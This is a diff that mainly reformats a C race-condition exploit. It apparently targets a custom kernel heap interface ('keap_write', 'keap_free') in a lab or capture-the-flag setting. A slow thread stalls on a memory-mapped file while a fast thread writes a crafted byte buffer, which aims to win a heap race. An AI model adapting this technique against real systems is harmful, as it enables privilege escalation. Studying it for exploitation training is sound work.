@@ -1,10 +1,7 @@
-#include <stdlib.h>
-#define _GNU_SOURCE
-
-#include <pthread.h>
-#include <unistd.h>
 #include "libs/pwn.h"
-
+#include <pthread.h>
+#include <stdlib.h>
+#include <unistd.h>
 
 /*******************************
  * EXPLOIT                     *
@@ -15,11 +12,7 @@
 #define SLOW_CPU 1
 #define FAST_CPU 2
 
-enum RACE{
-  RACE_ONGOING = 0,
-  RACE_WON,
-  RACE_LOST
-}
+enum RACE { RACE_ONGOING = 0, RACE_WON, RACE_LOST };
 
 int race_done = 0;
 
@@ -34,7 +27,6 @@ void *fast(void *buf) {
   keap_write(ptr, buf, BUF_SIZE);
   linfo("fast thread done");
   keap_free(ptr);
-
 }
 
 void *slow(void *buf) {
@@ -51,11 +43,9 @@ void *slow(void *buf) {
   keap_write(ptr, buf, BUF_SIZE);
   linfo("slow thread done");
   keap_free(ptr);
-
 }
 
-
-int main(int argc, char* argv[]) {
+int main(int argc, char *argv[]) {
   int fd = -1;
   void *map;
   const char *buf = "\x06\xfe\x1b\xe2\0\0\0";
@@ -73,7 +63,7 @@ int main(int argc, char* argv[]) {
   // create target file
   fd = SYSCHK(open(SLOW_FILE, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
 
-  CHK(write(fd, buf, BUF_SIZE)==BUF_SIZE);
+  CHK(write(fd, buf, BUF_SIZE) == BUF_SIZE);
   SYSCHK(close(fd));
 
   fd = SYSCHK(open(SLOW_FILE, O_RDWR));
@@ -83,7 +73,7 @@ int main(int argc, char* argv[]) {
 
   // create a busy thread to slow down execution
   pthread_create(&slow_t, NULL, slow, map);
-  pthread_create(&fast_t, NULL, fast, (void*) buf);
+  pthread_create(&fast_t, NULL, fast, (void *)buf);
 
   pthread_join(slow_t, NULL);
   pthread_join(fast_t, NULL);
@@ -92,5 +82,4 @@ int main(int argc, char* argv[]) {
     lerror("failed racer");
 
   linfo("won race!!");
-
 }
